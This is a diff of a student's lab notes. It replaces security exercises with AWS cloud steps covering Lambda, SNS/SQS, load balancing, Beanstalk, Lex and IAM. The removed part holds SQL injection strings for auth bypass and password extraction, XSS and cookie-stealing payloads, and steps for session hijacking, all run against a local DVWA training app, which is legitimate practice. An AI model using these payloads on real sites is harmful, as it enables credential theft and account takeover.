@@ -1,169 +1,473 @@
-TASK 1
-For Inbound rules
-open windows defender firewall advanced security->inbound rules->right side new rule
-->custom next->all programs next->default next->remote ip->choose these ip
-->add ip->ok->block->next->domain,public,private->next->finish
-check in inbound rules then ip appear with blocked symbol
+WEEK 7 Lambda
 
-For Outbound rules
-rules.py
-import requests, csv, subprocess
-# source: Abuse CH
-response = requests.get(
-    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
-).text
-rule = 'netsh advfirewall firewall delete rule name="BadIP"'
-subprocess.run(["PowerShell", "-Command", rule])
-mycsv = csv.reader(
-    filter(lambda x: not x.startswith("#"), response.splitlines())
-)
-for row in mycsv:
-    ip = row[1]
-    if ip != "dst_ip":
-        print("Added Rule to block:", ip)
-        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
-        subprocess.run(["PowerShell", "-Command", rule])
-        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip         
-        subprocess.run(["PowerShell", "-Command", rule])
+-Create a general purpose s3 bucket, enable versioning
 
-In cmd run as administrator give -> python "path of rules.py"
-check outbound rules, IPs will be blocked as badIp
-----------------------------------------------------------
-TASK 2.1
-Open your email account
-Open any email from your account->click 3 dots
-->show original->download original
-Open EML analyzer and upload the file
-->In header session in from column copy the URL
-Open VirusTotal->paste the URL in search bar
-Output: if 0 then no malware 1 then malware
------------------------------------------------------ 
-TASK 2.2
-Password checking
-password.py
+-DynamoDB -> create table -> give name -> partition/row = unique , type = string
 
-import re
-def check_password_strength(password):
-    if len(password) < 8:
-        return "Weak: Password must be at least 8 characters long."
-    if not any(char.isdigit() for char in password):
-        return "Weak: Password must include at least one number."
-    if not any(char.isupper() for char in password):
-        return "Weak: Password must include at least one uppercase letter."
-    if not any(char.islower() for char in password):
-        return "Weak: Password must include at least one lowercase letter."
-    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
-        return "Medium: Add special characters to make your password stronger."
-    return "Strong: Your password is secure!"
-def password_checker():
-    print("Welcome to the Password Strength Checker!")
-    while True:
-        password = input("\nEnter your password (or type 'exit' to quit): ")
-        if password.lower() == "exit":
-            print("Thank you for using the Password Strength Checker! Goodbye!")
-            break
-        result = check_password_strength(password)
-        print(result)
-if __name__ == "__main__":
-    password_checker()
+-AWS Console → Lambda → Create Function → Author from scratch →
+Give Name → Runtime: Python →
+Choose Role (labrole / create new) → Create
 
-In cmd ->python "path of password.py"
-----------------------------------------------------------------
-TASK 3
-for packet analysis and network sniffing
-open kali Linux
-Terminal 1: python3 -m http.server 8080
-Terminal 2: sudo tcpdump -i any -w capture.pcap port 8080
-Open http://localhost:8080
-Go back to terminal 2 and do ctrl+c
-Open FileManager->click on capture.pcap file
-Wireshark will be opened
-search for http.request.method=="GET" and click on any http network appeared
-it will show binary formats of network
----------------------------------------------------------
-OPEN DVWA IN KALI LINUX AS
-Open terminal in Linux
-->sudo apt install dvwa –y
-->sudo service apache2 start 
-->sudo service mysql start
-Open firefox and give 127.0.0.1/DVWA
------------------------------------------- 
-TASK 4
-Open docker
-Open cmd, run docker run --rm -it -p 80:80 vulnerables/web -dvwa
-open chrome and search localhost
-login to dvwa website with admin and password
-create/reset database
-Relogin
-security=low
-Choose SQL injection and give commands
-1 (display user details) 
-1' OR '1'='1 (auth bypass)
-1' ORDER BY 1-- - 
-1' ORDER BY 2-- - 
-1' ORDER BY 3-- - (no. of cols)
-1' UNION SELECT 1,2-- - (union based inj)
-1' UNION SELECT database(),2-- - (to get db name)
-1' UNION SELECT table_name,2 FROM information_schema.tables 
-WHERE table_schema=database()-- - (extract table names)
-1' UNION SELECT column_name,2 FROM information_schema.columns  
-WHERE table_name='users'-- - (extract col names)
-1' UNION SELECT user,password FROM users-- - (extract username and pass)
--------------------------------------------------------------------
-TASK 5
-open dvwa
-create/reset db and security=low
+-Lambda func → Add Trigger → S3 →
+Select Bucket → Event: All object create → Add
 
-1.Reflected XSS
-<script>alert('XSS')</script> 
-output: Hello, pop up(in kali linux)
-______________
-2.Stored XSS
-Name: <h1>Hacked</h1> 
-Message: <script>alert('Stored XSS')</script> 
-output: hello, pop up
-_______________
-3.DOM XSS
-In the URL bar add: #<script>alert('DOM XSS')</script> 
-enter then output: popup
-______________
-4.Capture Cookie (Lab Demo) 
-In Stored XSS Message box: 
-<script>alert(document.cookie)</script> 
-output: popup with cookieId
----------------------------------------------------------------
-TASK 6
-*Authentication*
-open dvwa
-choose brute force attack
-->user:admin
-  pass:admin
-->user:admin
-  pass:admin123
-->user:admin
-  pass:password
+-Lambda → Code tab → Paste Python code → Deploy
 
-*Session Hijacking*
-Login into DVWA 
-->right click->inspect->application->cookies->copy sessionID
-Open edge
-->right click->iinspect->application->cookies->paste sessionID
-In edge url remove login.php and give index.php
-Output: login page will appear in edge
+import boto3
+from uuid import uuid4
 
-*session Hijacking in kali linux*
-Login into DVWA
-->right click->inspect->storage->cookies->copy sessionID
-Open private window
-->right cick->inspect->storage->cookies->paste sessionID
+# Initialize DynamoDB resource
+dynamodb = boto3.resource('dynamodb')
+table = dynamodb.Table('week7table')  # Your DynamoDB table name
 
-*session fixation*
-Login to DVWA
-Set security lo high
-->right click->inspect->application->cookies->copy sessionID
-Logout and again
-->right click->inspect->application->cookies->copy sessionID
-output: both sessionIDs should be different
-If security=low then sessionIDs are same
--------------------------------------------
+def lambda_handler(event, context):
+
+    if 'Records' in event:
+        for record in event['Records']:
+            bucket_name = record['s3']['bucket']['name']
+            object_key = record['s3']['object']['key']
+            size = record['s3']['object'].get('size', -1)
+            event_name = record.get('eventName', 'Unknown')
+            event_time = record.get('eventTime', 'Unknown')
+
+            table.put_item(
+                Item={
+                    'unique': str(uuid4()),
+                    'Bucket': bucket_name,
+                    'Object': object_key,
+                    'Size': size,
+                    'Event': event_name,
+                    'EventTime': event_time
+                }
+            )
+    else:
+        print("No 'Records' key found in the event")
+
+    return {
+        'statusCode': 200,
+        'body': 'Success'
+    }
+
+-IAM → Roles → Select Lambda Role →
+Add Permission → Create Inline Policy → JSON → Paste policy → Create (Only if u get error)S3 → Upload File →
+DynamoDB → Explore Items → Run → Check data
+
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "dynamodb:PutItem"
+      ],
+      "Resource": "arn:aws:dynamodb:*:*:table/week7table"
+    }
+  ]
+}
+
+-S3 → Upload File →
+DynamoDB → Explore Items → select ur table → Run → Check data
+
+-Lambda → Monitor → View CloudWatch Logs → Check logs
+
+
+
+
+------------------------------------------------------
+
+
+
+WEEK 8 - SNS SQS
+
+A) SNS → Email
+
+-AWS Console → SNS → Topics → Create Topic →
+Type: Standard → Name: MyEmailTopic → Create
+
+-SNS → Open Topic → Subscriptions → Create Subscription →
+Protocol: Email → Enter Email → Create
+
+-Email Inbox → Open AWS Mail → Click Confirm Subscription
+
+-SNS → Topic → Publish Message →
+Subject: Test → Message: Hello → Publish → Email received
+
+
+B) S3 → SNS → Email
+
+-AWS Console → S3 → Create Bucket →
+Enter Name → Select Region (same as SNS) → Create
+
+-SNS → Topics → Create Topic →
+Type: Standard → Name: S3UploadNotification → Create
+
+-SNS → Topic → Subscriptions → Create →
+Protocol: Email → Enter Email → Confirm via inbox
+
+-SNS → Topic → Access Policy → Edit → Paste:
+
+{
+  "Version": "2008-10-17",
+  "Id": "__default_policy_ID",
+  "Statement": [
+    
+    {
+      "Sid": "__default_statement_ID",
+      "Effect": "Allow",
+      "Principal": { "AWS": "*" },
+      "Action": [
+        "SNS:Publish",
+        "SNS:RemovePermission",
+        "SNS:SetTopicAttributes",
+        "SNS:DeleteTopic",
+        "SNS:ListSubscriptionsByTopic",
+        "SNS:GetTopicAttributes",
+        "SNS:AddPermission",
+        "SNS:Subscribe"
+      ],
+      "Resource": "arn:aws:sns:us-east-1:475987035617:MyEmailTopic",
+      "Condition": {
+        "StringEquals": {
+          "AWS:SourceAccount": "475987035617"
+        }
+      }
+    },
+
+    {
+      "Sid": "AllowS3Publish",
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "s3.amazonaws.com"
+      },
+      "Action": "SNS:Publish",
+      "Resource": "arn:aws:sns:us-east-1:475987035617:MyEmailTopic",
+      "Condition": {
+        "ArnLike": {
+          "aws:SourceArn": "arn:aws:s3:::YOUR_BUCKET_NAME"
+        },
+        "StringEquals": {
+          "aws:SourceAccount": "475987035617"
+        }
+      }
+    }
+
+  ]
+}
+
+-S3 → Bucket → Properties → Event Notifications → Create →
+Event Type: All object create →
+Destination: SNS Topic → Select Topic → Save
+
+-S3 → Upload File → Email will be received
+
+
+C) SQS
+
+-AWS Console → SQS → Create Queue →
+Type: Standard → Name: MyQueue → Create
+
+-SQS → Open MyQueue → Send and receive messages →
+Type Message → Send
+
+-SQS → Same page → Poll for messages →
+View message → (Optional: Delete)
+
+
+D)S3 → SNS → SQS → Lambda
+
+-AWS Console → S3 → Create Bucket → Name: mys3eventbucket123 → Create
+
+-SNS → Topics → Create → Type: Standard → Name: MyS3SNSTopic → Create
+
+-SQS → Create Queue → Type: Standard → Name: MyS3Queue → Create
+
+-SNS → Topic → Create Subscription → Protocol: SQS → Select MyS3Queue → Create
+
+-SQS → Queue → Access Policy → Edit → Paste:
+
+{
+  "Version": "2012-10-17",
+  "Id": "__default_policy_ID",
+  "Statement": [
+    {
+      "Sid": "__owner_statement",
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::475987035617:root"
+      },
+      "Action": "SQS:*",
+      "Resource": "arn:aws:sqs:us-east-1:475987035617:week8q"
+    },
+    {
+      "Sid": "Allow-SNS-SendMessage",
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "sns.amazonaws.com"
+      },
+      "Action": "SQS:SendMessage",
+      "Resource": "arn:aws:sqs:us-east-1:475987035617:week8q",
+      "Condition": {
+        "ArnEquals": {
+          "aws:SourceArn": "arn:aws:sns:us-east-1:475987035617:MyEmailTopic"
+        }
+      }
+    }
+  ]
+}
+
+-SNS → Topic → Access Policy → Edit → Allow S3 (same as Part 2 policy)
+
+-S3 → Bucket → Properties → Event Notifications → Create →
+Event: All object create →
+Destination: SNS Topic → Save
+
+- upload any file in s3 bucket
+
+- sqs queue → poll msgs → obj upload item/msg
+
+-Lambda → Create Function → Name: SQSConsumerFunction → Runtime: Python → Create
+
+-Lambda → Add Trigger → SQS → Select MyS3Queue → Add
+
+-Add lambda code:
+
+import ----smtg(json)
+def lambda_handler(event, context):
+    for record in event['Records']:
+        print("Message from SQS:")
+        print(record['body'])
+
+    return {
+        'statusCode': 200,
+        'body': 'Processed'
+    }
+
+-S3 → Upload File → S3 → SNS → SQS → Lambda → Logs
+
+
+
+
+
+-------------------------------
+
+
+
+WEEK 9 Load Balancer ASG
+
+-AWS Console → EC2 → Launch Instance →
+Name: webserver-1 →
+AMI: Amazon Linux 2 →
+Instance Type: t2.micro →
+Security Group:
+SSH (22) → My IP
+HTTP (80) → Anywhere →
+Create/Select Key Pair → Launch
+
+-cd path where key file is
+-click connect in ec2, copy ssh cmd
+-paste ssh cmd
+sudo yum update -y
+sudo yum install httpd -y
+sudo systemctl start httpd
+sudo systemctl enable httpd
+echo "This is Server 1" | sudo tee /var/www/html/index.html
+
+Repeat same steps →
+Name: webserver-2 → echo server 2
+
+-EC2 → Security Groups → Create → Name: lb-sg →
+Allow: HTTP (80) from Anywhere → Create
+
+- Add inbound rule : HTTP 80 0.0.0.0/0 anywhere
+Check if out bound rule is there : All traffic 0.0...
+
+-EC2 → Load Balancers → Create → Type: Application Load Balancer →
+Name: my-alb
+Scheme: Internet-facing IP: IPv4
+-Listener → HTTP (80) → Default (keep)
+-Choose VPC → Select 2 or all subnets (AZs)
+-Attach Security Group Select lb-sg
+-Create Target Group - Name: web-servers-tg →
+Target Type: Instance → Protocol: HTTP → Port: 80 → Create
+-Register Targets - Select: webserver-1, webserver-2 → Register
+-Review → Create Load Balancer
+
+-Copy DNS → Paste in browser → Refresh
+
+-EC2 → Instances → Select instance → Actions → Image & Templates → Create Image → 
+Name: my-webserver-AMI → Create → Wait till available
+
+-EC2 → Launch Templates → Create → Name: my-launch-template →
+AMI: Select created AMI → Instance Type: t2.micro →
+Key Pair: Select → Security Group: select created sg → Create
+
+-EC2 → Auto Scaling Groups → Create → Name: webserver-asg → Select Launch Template → Next
+-Select VPC → Select all subnets →
+Attach to existing Load Balancer → Select my-alb →
+Health Check: HTTP → Grace Period: 300 → Next
+-Desired: 2 Minimum: 1 Maximum: 4 → Next
+-Review → Create
+
+-Terminate one EC2 attached to asg → New instance auto-created
+-ALB → Target Group → Instances show healthy
+
+
+
+------------------------------------------
+
+WEEK 10 Beanstalk
+
+-Open eclipse ide
+-File → new → dynamic web project → give name -> if tomcat is not working select none → finish
+-right click on project name → new → http file → name = index.html → finish
+-Open index.html and write code title, add <h1>, save
+-right click  → export → download war file
+
+-AWS Console → Search Elastic Beanstalk →
+Click Create → Application Enter Name: MyApp → (Optional: Description) → create
+
+-Click Create Environment → Select: Web Server Environment → Select
+-Environment Name → Enter Platform → Select: Tomcat (for .war) OR Node.js / Python / PHP
+Application Code → Upload → Upload .war / .zip → give version name = v1
+-Service Role → Select LabRole EC2 Instance Profile → Select LabInstanceProfile Key Pair → Optional
+-Select VPC → Default Select Subnets → Enable Public IP
+-Instance Type → t2.micro , Min: 1 , Max: 2, Load Balancer → Enable
+- review → create
+
+wait till health ok → copy domain url → open in browser → u can see application
+
+-Update Application: Beanstalk → Environment → Upload and Deploy → Upload new .war / .zip → give version name v2 
+-Deploy -> New version updated
+
+
+
+--------------------------------------
+
+
+
+WEEK 11 LEX
+
+-AWS Console → Search Amazon Lex → Click Create Bot
+
+-Choose → Create blank bot → Bot Name: HotelBookingBot → IAM Role → Create new role → Language → English(same region) → Click Done
+
+-Lex → Intents → Create → Name: BookHotel (automatically intent is opened after creating bot)
+
+-Add Utterances
+I want to book a hotel
+Book a room
+Reserve hotel
+I need a room
+
+-Add slot → name: age → type: AMAZON.Number → give prompt → required
+Slot → Advanced options → slot ... success → Conditional branching → If {age} < 18 → response: Not eligible
+
+-Add slot → name: location → type: AMAZON.City → give prompt → required
+
+-Add slot → name: checkin → type: AMAZON.Date → prompt → required
+optional slot failure to add a msg for retry
+
+-Add slot → name: nights → type: AMAZON.Number → required
+
+-save 
+
+-Slot Types → Create blank slot type → Name: RoomType → Values: Single, Double, Suite → Save
+
+-Back to Intent → Add slot → name: RoomType → type: RoomType
+Advanced options → Slot → Prompt → Add Card Group → give card title → Buttons: Single / Double / Suite
+
+-Initial response → Welcome message →
+Confirmation → do u want to confirm for {location} for {nights} nights?
+
+- Build and test
+
+
+
+
+---------------------------------------
+
+
+
+WEEK 12 IAM user 
+
+GUI
+
+Login AWS → Root User → Open IAM
+
+IAM → Users → Create User
+
+Enter Name (S3_Specialist) → select Provide Console Access → Set custom Password
+
+Permissions → Attach policies directly → Select AmazonS3FullAccess
+
+Review → Create User → Download .csv file
+
+Copy Account ID → Logout
+
+Open Sign-in URL → Select IAM User
+
+Enter Account ID + Username + Password → Login
+
+Test EC2 instance → Access Denied
+
+Test S3 → Create Bucket → Success
+
+
+CLI
+
+Login as root
+
+IAM → Users → Select s3 User → Security Credentials
+
+Create Access Key → Select CLI → acknowledge the warning → Download .csv file
+
+Install AWS CLI
+
+Open CMD → Type aws configure
+
+Enter Access Key + Secret Key from csv file
+
+Enter Region (ap-south-1) → Output: json
+
+Run aws s3 ls → Success
+
+Run aws s3 mb s3://new-bucket-name → Success
+
+Run aws iam list-users → Access Denied
+
+
+
+
+-------------------------------
+
+
+
+WEEK 13 IAM Role
+
+login as root
+
+AWS Console → IAM → Roles → Create Role →
+Trusted Entity: AWS Service → Use Case: EC2 → Next
+
+Search Policy → AmazonS3FullAccess → Select → Next
+
+Enter Name: EC2-S3-Role → Create Role
+
+
+EC2 → Instances → create instance(use key) → Select Running Instance →
+Actions → Security → Modify IAM Role →
+Select EC2-S3-Role → Update
+
+Connect to EC2
+
+SSH → Login to instance
+
+If no key direct ec2 connect 
+
+aws s3 ls - works
+
+aws ec2 describe-instances - unauthorized
+
+
+
 
